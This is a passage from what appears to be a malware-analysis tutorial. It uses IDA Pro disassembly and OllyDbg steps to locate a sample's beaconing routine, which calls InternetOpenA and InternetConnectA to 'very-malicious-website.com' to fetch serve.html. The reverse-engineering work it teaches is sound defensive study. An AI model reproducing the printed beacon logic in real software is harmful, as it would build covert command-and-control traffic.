+   7. We are going to set a breakpoint at a point in the malware code just before it goes out to retrieve the serve.html file. In order to figure out where we need to place this breakpoint, we switch back to IDA Pro and find the part in the `ServiceMain` subroutine that is responsible for this function:

```
```
loc_10004566:
xor ebp, ebp
push ebp ; dwFlags
push ebp ; lpszProxyBypass
push ebp ; lpszProxy
push ebp ; dwAccessType
push offset szAgent ; lpszAgent
call ds:InternetOpenA
cmp eax, ebp
mov [esp+28h+hInternet], eax
jnz short loc_10004584
```
```

```
```
loc_10004584:
push ebp ; dwContext
push 400000h ; dwFlags
mov ecx, offset szPassword
push 3 ; dwService
push ecx ; lpszPassword
push ecx ; lpszUserName
push 50h ; nServerPort
push offset szServerName ; "very-malicious-website.com"
push eax ; hInternet
call ds:InternetConnectA
mov ebp, eax
test ebp, ebp
jz loc_1000462D
```
```

Figure 11.52 – Malware – beaconing function location

+   8. The preceding screenshot shows our interesting location – `loc_10004566`; this is where the parameters for the `InternetOpenA` API call are filled, and it comes right after the `sleep` function at the bottom of `ServiceMain`. Placing a breakpoint here would allow us to interrupt the program just before the beacon goes out. In order to find `loc_10004566` in OllyDbg, we instruct the debugger to go to that location by entering `Ctrl + G` and typing in the memory location (10004566):